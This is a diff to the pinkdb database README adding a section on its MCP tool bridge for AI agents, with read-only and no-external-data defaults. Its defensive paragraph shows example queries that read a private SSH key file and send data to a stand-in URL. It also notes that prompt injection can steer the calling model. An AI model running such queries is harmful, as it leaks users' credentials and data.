@@ -1222,6 +1222,65 @@ pool** — the async runtime never executes engine code. See
 [`docs/server-ui.md`](docs/server-ui.md) for the full policy, the endpoint
 list and the known limits (no query console yet).
 
+## Agents and MCP (wave 105)
+
+pinkdb contains no model code. An agent — pi, Claude Code, fx, any MCP
+client — brings the reasoning and pinkdb exposes tools over the [Model
+Context Protocol](https://modelcontextprotocol.io): the same compact
+Markdown results, truncation notices and one-line JSON errors as `-agent`
+mode, under the same row/time budgets.
+
+```sh
+cargo build --release -p pinkdb-cli -p pinkdb-mcp
+./target/release/pinkdb --mcp sales.pink            # stdio, read-only
+```
+
+`--mcp` loads `libpinkdb_mcp` from the install directory (or
+`--mcp-extension PATH`) and serves one client on stdio. In an interactive
+session, `.mcp serve [stdio|http <port>] [allow-writes]` serves after
+`LOAD EXTENSION '<path>/libpinkdb_mcp.dylib'`; `pinkdb-server
+--mcp-extension PATH` serves the server's own store over `127.0.0.1:7801`
+(under the server's logins: `--mcp-user NAME` and `PINKDB_MCP_PASSWORD` when
+the store has users).
+
+Tools: `query(sql)` (Markdown, capped at 100 rows with the true count),
+`describe(table)`, `tables(database?)`, `databases()`, `explain(sql)` (with
+the wave-99 cost hint) and the lake readers `lake_tables`, `lake_versions`,
+`lake_changes` — the last three need a CLI built with `pinklake`.
+
+**Read-only by default.** The host statement callback — not the extension —
+refuses DML/DDL, `COPY … TO`, `LOAD EXTENSION` and every other statement
+outside its query allowlist, and the lake tools refuse commit/maintenance,
+unless the session was started with `allow-writes`; with it, writes still run
+under the engine's grants and limits. (The engine has no `SET` statement, and
+`ATTACH` is a `.lake` command, not SQL.) The HTTP transport binds loopback
+only and refuses any other address.
+
+**No external data either.** A `SELECT` is not harmless on its own: table
+functions and replacement scans reach outside the store —
+`read_csv('/home/u/.ssh/id_rsa')`, `read_parquet('https://example.com/?d=…')`,
+`FROM 'file.parquet'` — and over MCP the caller is a model that a prompt
+injection can steer. The host binds each statement and refuses a table
+function or file path unless the session was started with `allow-files`
+(`pinkdb --mcp FILE --mcp-allow-files`, `.mcp serve … allow-files`).
+`allow-writes` does not imply it; the two are separate risks. On the
+`pinkdb-server` bridge the login's grants decide instead: file scans are
+administrator-only there (RBAC M-4).
+
+The bridge is an ordinary extension, built on two **additive** ABI
+capabilities (minor 2, detection by symbol presence, so every v1 extension
+loads unchanged): a text-in/text-out statement callback
+(`PinkdbHostApi::execute_statement`) and an optional `pinkdb_ext_serve`
+export the host calls with a transport descriptor (`stdio` or
+`http:HOST:PORT`) and an options string. No engine structure crosses the
+boundary. Measured on the same machine with the bridge built separately, the
+release binaries grew by 0.9% (`pinkdb`, 4,221,296 → 4,260,048 bytes) and 3.3%
+(`pinkdb-server`, 3,802,464 → 3,927,120 bytes); the bridge itself is 565,824
+bytes. Any MCP client connects with no adapter, e.g.
+`pi mcp add pinkdb -- pinkdb --mcp sales.pink` (pi) or
+`claude mcp add pinkdb -- pinkdb --mcp sales.pink` (Claude Code). The C/C++/Go
+SDKs get the serve surface with the next SDK refresh.
+
 ## C ABI (`pinkdb-ffi`)
 
 The `pinkdb-ffi` crate exposes the engine over a small C ABI as
